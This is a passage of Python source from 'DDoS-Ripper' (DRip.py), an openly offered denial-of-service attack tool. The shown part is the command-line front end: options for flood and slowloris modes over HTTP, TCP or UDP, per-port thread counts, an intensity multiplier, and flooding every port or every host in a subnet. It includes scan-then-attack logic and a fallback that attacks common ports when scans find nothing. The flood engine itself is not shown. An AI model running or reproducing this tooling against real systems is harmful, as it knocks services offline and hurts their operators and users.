        description='DDoS-Ripper - Distributable Denied-of-Service (DDOS) attack server with port scanning',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack
  python3 DRip.py -s 192.168.1.1 -t 135
  
  # Attack with URL
  python3 DRip.py -s https://example.com -t 200
  
  # Slowloris attack
  python3 DRip.py -s example.com -t 500 --mode slowloris
  
  # Port scan and attack
  python3 DRip.py -s 192.168.1.1 --scan
  
  # Scan common ports only
  python3 DRip.py -s 192.168.1.1 --scan-common
  
  # Scan specific port range
  python3 DRip.py -s 192.168.1.1 --scan-range 1 1000
  
  # Attack specific ports
  python3 DRip.py -s 192.168.1.1 -t 200 --ports 80,443,8080
  
  # Attack all IPs in subnet and all their ports
  python3 DRip.py -s 192.168.1.1 -t 200 --attack-network
  
  # Attack network with custom subnet mask
  python3 DRip.py -s 192.168.1.1 -t 200 --attack-network --subnet-mask 16
        """
    )
    
    parser.add_argument('-s', '--server', required=True,
                       help='Target server (IP address, hostname, or URL)')
    parser.add_argument('-t', '--threads', type=int, default=135,
                       help='Number of threads per port (default: 135)')
    parser.add_argument('--mode', default='flood',
                       choices=['flood', 'slowloris'],
                       help='Attack mode: flood (default) or slowloris')
    parser.add_argument('--protocol', default='http',
                       choices=['http', 'tcp', 'udp'],
                       help='Protocol to use: http (default), tcp, or udp')
    parser.add_argument('--scan', action='store_true',
                       help='Scan all ports (1-65535) and attack detected ports')
    parser.add_argument('--scan-common', action='store_true',
                       help='Scan common ports only and attack detected ports')
    parser.add_argument('--scan-range', nargs=2, type=int, metavar=('START', 'END'),
                       help='Scan specific port range (e.g., --scan-range 1 1000)')
    parser.add_argument('--ports', type=str,
                       help='Attack specific ports (comma-separated, e.g., 80,443,8080)')
    parser.add_argument('--attack-all', action='store_true',
                       help='Attack all detected ports without prompting (use with --scan)')
    parser.add_argument('--attack-all-ports', action='store_true',
                       help='Attack ALL ports (1-65535) simultaneously without scanning')
    parser.add_argument('--attack-port-range', nargs=2, type=int, metavar=('START', 'END'),
                       help='Attack all ports in a range (e.g., --attack-port-range 1 1000)')
    parser.add_argument('--scan-timeout', type=float, default=3.0,
                       help='Port scan timeout in seconds (default: 3.0)')
    parser.add_argument('--scan-retries', type=int, default=2,
                       help='Number of retries per port (default: 2)')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output during scanning')
    parser.add_argument('--skip-test', action='store_true',
                       help='Skip connection test for faster startup')
    parser.add_argument('--intensity', type=int, default=1, metavar='N',
                       help='Attack intensity multiplier (1=normal, 2=2x requests per connection, 3=3x, etc.) (default: 1)')
    parser.add_argument('--force-common-ports', action='store_true',
                       help='Force attack on common ports even if scan fails')
    parser.add_argument('--attack-network', action='store_true',
                       help='Attack all IPs in the same subnet and all their ports')
    parser.add_argument('--subnet-mask', type=int, default=24,
                       help='Subnet mask for network scanning (default: 24)')
    
    args = parser.parse_args()
    
    # Extract host from server
    target = args.server
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    parsed = urlparse(target)
    host = parsed.hostname or parsed.path.split('/')[0]
    
    # Check if host is an IP address
    try:
        ipaddress.IPv4Address(host)
        is_ip = True
    except:
        is_ip = False
    
    ports_to_attack = None
    targets_dict = None
    
    # Handle --attack-network (attack all IPs in subnet and all their ports)
    if args.attack_network:
        if not is_ip:
            print("\n❌ --attack-network requires an IP address, not a hostname or URL")
            sys.exit(1)
        
        print(f"\n🌐 Network Attack Mode")
        print(f"Finding all IPs in subnet /{args.subnet_mask}...")
        associated_ips = get_associated_ips(host, args.subnet_mask)
        print(f"✅ Found {len(associated_ips)} IP(s) in subnet")
        
        if len(associated_ips) > 50:
            print(f"⚠️  Warning: {len(associated_ips)} IPs found. This may take a very long time.")
            response = input("Continue? (y/n): ").strip().lower()
            if response != 'y':
                print("Exiting.")
                sys.exit(0)
        
        # Scan all ports on all IPs
        print(f"\n🔍 Scanning common ports on all {len(associated_ips)} IP(s)...")
        print("This may take a while. Please wait...\n")
        
        targets_dict = {}
        for ip in associated_ips:
            print(f"Scanning {ip}...", end=' ', flush=True)
            scanner = PortScanner(ip, timeout=0.5)  # Faster timeout for network scan
            open_ports = scanner.scan_common_ports(silent=True)
            if open_ports:
                targets_dict[ip] = open_ports
                print(f"✓ Found {len(open_ports)} open port(s): {', '.join(map(str, open_ports))}")
            else:
                print("✗ No open ports")
        
        if not targets_dict:
            print("\n❌ No open ports found on any IP in the subnet. Exiting.")
            sys.exit(1)
        
        total_ips = len(targets_dict)
        total_ports = sum(len(ports) for ports in targets_dict.values())
        print(f"\n✅ Scan complete! Found {total_ports} open port(s) across {total_ips} IP(s)")
        print(f"Starting attack on all detected IPs and ports...")
    
    # Test connectivity first
    print(f"\n🔍 Testing connectivity to {host}...")
    test_scanner = PortScanner(host, timeout=2.0, retries=1)
    if not test_scanner.check_host_reachable():
        print(f"⚠️  Warning: Host {host} may not be reachable or DNS resolution failed")
        print("   Continuing anyway...")
    else:
        print(f"✅ Host {host} is reachable")
    
    # Handle --attack-all without scanning options (auto-scan common ports)
    if args.attack_all and not (args.scan or args.scan_common or args.scan_range):
        print("\n⚠️  --attack-all specified without scan option. Auto-scanning common ports...")
        scanner = PortScanner(host, timeout=args.scan_timeout, retries=args.scan_retries)
        open_ports = scanner.scan_common_ports()
        
        if not open_ports:
            print("\n⚠️  No open ports found in common ports scan.")
            
            if args.force_common_ports:
                print("   🔥 --force-common-ports enabled: Attacking common ports anyway")
            else:
                print("   This could mean:")
                print("   - Ports are filtered/firewalled")
                print("   - Host is not reachable")
                print("   - Ports are on non-standard numbers")
                print("\n   🔥 FALLBACK: Attacking common ports anyway (80, 443, 8080, 8443)")
                print("   (Some firewalls block port scans but allow actual connections)")
            
            # Fallback to common web ports
            fallback_ports = [80, 443, 8080, 8443, 8888, 8000, 3000, 5000]
            ports_to_attack = fallback_ports
            print(f"\n✅ Will attack common ports: {', '.join(map(str, ports_to_attack))}")
        else:
            ports_to_attack = open_ports
            print(f"\n✅ Attacking all {len(ports_to_attack)} detected ports: {', '.join(map(str, ports_to_attack))}")
    
    # Handle port scanning
    elif args.scan or args.scan_common or args.scan_range:
        scanner = PortScanner(host, timeout=args.scan_timeout, retries=args.scan_retries)
        
        if args.scan_common:
            open_ports = scanner.scan_common_ports()
        elif args.scan_range:
            start, end = args.scan_range
            open_ports = scanner.scan_range(start, end)
        else:
            open_ports = scanner.scan_range()
        
        if not open_ports:
            print("\n⚠️  No open ports found.")
            
            if args.force_common_ports or args.attack_all:
                print("   🔥 Attacking common ports anyway (firewall may block scans but allow connections)")
            else:
                print("   This could mean:")
                print("   - Ports are filtered/firewalled")
                print("   - Host is not reachable")
                print("   - Ports are on non-standard numbers")
                print("\n   🔥 FALLBACK: Attacking common ports anyway (80, 443, 8080, 8443)")
                print("   (Some firewalls block port scans but allow actual connections)")
            
            # Fallback to common web ports
            fallback_ports = [80, 443, 8080, 8443, 8888, 8000, 3000, 5000]
            open_ports = fallback_ports
            print(f"\n✅ Will attack common ports: {', '.join(map(str, open_ports))}")
        
        if args.attack_all:
            ports_to_attack = open_ports
            print(f"\n✅ Attacking all {len(ports_to_attack)} detected ports: {', '.join(map(str, ports_to_attack))}")
        else:
            ports_to_attack = select_ports(open_ports)
            if not ports_to_attack:
                print("\n❌ No ports selected. Exiting.")
                sys.exit(0)
    
    # Handle attack all ports (1-65535)
    elif args.attack_all_ports:
        print("\n🔥 ATTACKING ALL PORTS (1-65535) SIMULTANEOUSLY")
        print("⚠️  WARNING: This will create 65,535 concurrent attacks!")
        print("   This is extremely resource-intensive and may overwhelm your system.")
        print("   Press Ctrl+C within 3 seconds to cancel...")
        time.sleep(3)
        
        ports_to_attack = list(range(1, 65536))
        print(f"\n✅ Will attack ALL {len(ports_to_attack)} ports simultaneously")
        print(f"   Total threads: {args.threads} per port = {args.threads * len(ports_to_attack):,} total threads")
        print("   Starting attack in 2 seconds...")
        time.sleep(2)
    
    # Handle attack port range
    elif args.attack_port_range:
        start, end = args.attack_port_range
        if start < 1 or end > 65535 or start > end:
            print("❌ Invalid port range. Must be between 1-65535 and start <= end")
            sys.exit(1)
        
        ports_to_attack = list(range(start, end + 1))
        total_threads = args.threads * len(ports_to_attack)
        
        print(f"\n🔥 ATTACKING PORT RANGE {start}-{end} ({len(ports_to_attack)} ports)")
        print(f"   Total threads: {args.threads} per port = {total_threads:,} total threads")
        
        if total_threads > 100000:
            print("⚠️  WARNING: Very high thread count! This may overwhelm your system.")
            print("   Press Ctrl+C within 3 seconds to cancel...")
            time.sleep(3)
        
        print(f"\n✅ Will attack {len(ports_to_attack)} ports: {start}-{end}")
    
    # Handle specific ports
    elif args.ports:
        try:
            ports_to_attack = [int(p.strip()) for p in args.ports.split(',')]
            print(f"\n✅ Attacking ports: {', '.join(map(str, ports_to_attack))}")
        except ValueError:
            print("❌ Invalid port format. Use comma-separated numbers (e.g., 80,443,8080)")
            sys.exit(1)
    
    # Validate slowloris only works with HTTP
    if args.mode == 'slowloris' and args.protocol != 'http':
        print("❌ Error: Slowloris mode only works with HTTP protocol")
        print("   Use --protocol http with --mode slowloris")
        sys.exit(1)
    
    # Create and run DRipper
    ripper = DRipper(target=args.server, threads=args.threads, skip_test=args.skip_test, intensity=args.intensity, protocol=args.protocol)
    
    try:
        ripper.start_time = time.time()
        if targets_dict:
            ripper.run(mode=args.mode, ports=ports_to_attack, targets=targets_dict)
        else:
            ripper.run(mode=args.mode, ports=ports_to_attack)
    except Exception as e:
        print(f"\n❌ Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == '__main__':
    main()
